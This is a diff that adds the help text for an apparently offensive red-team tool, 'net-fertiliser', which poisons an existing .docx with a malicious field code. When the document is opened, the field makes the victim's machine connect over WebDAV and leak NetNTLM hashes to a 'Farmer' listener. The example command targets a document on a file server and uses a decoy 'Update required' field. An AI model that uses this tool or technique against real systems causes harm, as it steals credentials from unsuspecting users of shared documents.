@@ -1,0 +1,15 @@
+ABOUT
+    Poisons an existing Office document (currently .docx) with a malicious field code
+    that triggers a WebDAV connection when the document is opened, leaking NetNTLM hashes
+    to a Farmer listener.
+
+USAGE:
+    net-fertiliser --- <path> <WebDAV path> <field comment>
+
+ARGUMENTS:
+    path            Path to the target .docx file (local or UNC)
+    WebDAV path     HTTP or WebDAV URL the field code will reference
+    field comment   Visible text shown in the injected field
+
+EXAMPLES:
+    net-fertiliser --- \\fileserver\important.docx http://workstation:8888/foo "Update required"
